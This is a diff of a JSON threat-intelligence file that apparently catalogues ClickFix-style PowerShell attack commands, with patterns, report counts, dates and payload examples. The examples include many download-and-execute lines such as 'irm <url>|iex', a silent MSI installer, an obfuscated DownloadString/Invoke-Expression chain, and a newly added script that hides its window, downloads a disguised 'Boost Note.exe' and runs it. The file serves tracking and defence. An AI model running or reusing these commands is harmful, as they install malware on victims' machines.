@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 146,
-    "ReportCount": 146,
-    "FirstSeen": "2026-11-14T01:23:57.427000+00:00",
+    "DistinctPayloadCount": 145,
+    "ReportCount": 145,
+    "FirstSeen": "2026-11-14T14:44:10.592000+00:00",
     "LastSeen": "2026-11-20T05:30:54.841000+00:00",
     "ReportIds": [
-      "cmwfq2sdt0iq70omlfqlpffxx",
       "cmwginvma0lic0omlk1c2ku1a",
       "cmwgmq2yd0lr20omlqz1zffk5",
       "cmwh0wou40mte0omlvnsta2vn",
@@ -198,7 +197,6 @@
       "irm 'browse-cloud.codes/5d1e600c4bc32eac'|iex;",
       "irm 'browse-cloud.codes/5e2e8270c24f6abc'|iex;",
       "irm 'browse-cloud.codes/5ec9a9678de2ef32'|iex;",
-      "irm 'browse-cloud.codes/5f16a861fec93d5c'|iex;",
       "irm 'browse-cloud.codes/6212895d940eee1b'|iex;",
       "irm 'browse-cloud.codes/65ba5e5cabdf023c'|iex;",
       "irm 'browse-cloud.codes/66e3f1b391f2996a'|iex;",
@@ -306,10 +304,9 @@
     "Pattern": "(irm '<URL>')|iex",
     "DistinctPayloadCount": 110,
     "ReportCount": 110,
-    "FirstSeen": "2026-11-14T01:19:02.441000+00:00",
-    "LastSeen": "2026-11-21T00:48:49.049000+00:00",
+    "FirstSeen": "2026-11-14T01:33:36.554000+00:00",
+    "LastSeen": "2026-11-21T01:20:41.503000+00:00",
     "ReportIds": [
-      "cmwfpwgss0ihy0omlygayvwid",
       "cmwfqf7a40ivv0oml8u89k1od",
       "cmwh41hiz0nhk0oml3qlpmmlm",
       "cmwha7m190r1q0oml7wq3r1hy",
@@ -418,12 +415,12 @@
       "cmwpddiwu23050omlwlpexkd6",
       "cmwphkd1n233y0omlg0rtb6wr",
       "cmwpowabb23s00omlnjfvwnz5",
-      "cmwpowk8923to0omlpmzxz9ut"
+      "cmwpowk8923to0omlpmzxz9ut",
+      "cmwpq1jvq23wg0omlvvcycyd4"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
       "(irm 'https://github[.]pw/8pchkbdes5/6d9667cd120637a1')|iex",
-      "(irm 'https://github[.]pw/Girya/1a887bc54c6d3982')|iex",
       "(irm 'https://github[.]pw/Girya/80b09b7fad57f0fd')|iex",
       "(irm 'https://github[.]pw/Girya/b048f5c52ebe0ffe')|iex",
       "(irm 'https://github[.]pw/click/41422c4edd1735b5')|iex",
@@ -492,6 +489,7 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/9430b97dfeaa939b')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/949cd932a9b4bd42')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/96f5354b102ae253')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/99ef1787ae952355')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/9beed38f887f936f')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a49871b1ae44d6d5')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a7a68d1534d986f1')|iex",
@@ -876,11 +874,10 @@
   {
     "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 6,
-    "FirstSeen": "2026-11-14T01:20:56.286000+00:00",
+    "ReportCount": 5,
+    "FirstSeen": "2026-11-14T16:37:57.382000+00:00",
     "LastSeen": "2026-11-17T20:46:15.496000+00:00",
     "ReportIds": [
-      "cmwfpywm20ikw0omloshmzs1c",
       "cmwgmq76i0lru0omlkr8mx6sp",
       "cmwgs7swd0lxo0oml3ahm9x1b",
       "cmwh41jw00nhv0omlq5rsqtp4",
@@ -1010,6 +1007,19 @@
     ],
     "PayloadExamples": [
       "$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...a) { window.clipboardData.setData('Text', command); } }); <!-- clickfix-observer-corpus --> powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/'...\n...w-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression"
+    ]
+  },
+  {
+    "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-21T01:20:51.962000+00:00",
+    "LastSeen": "2026-11-21T01:20:51.962000+00:00",
+    "ReportIds": [
+      "cmwpq1rz623xv0oml9b7ckyzg"
+    ],
+    "PayloadExamples": [
+      "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit"
     ]
   },
   {
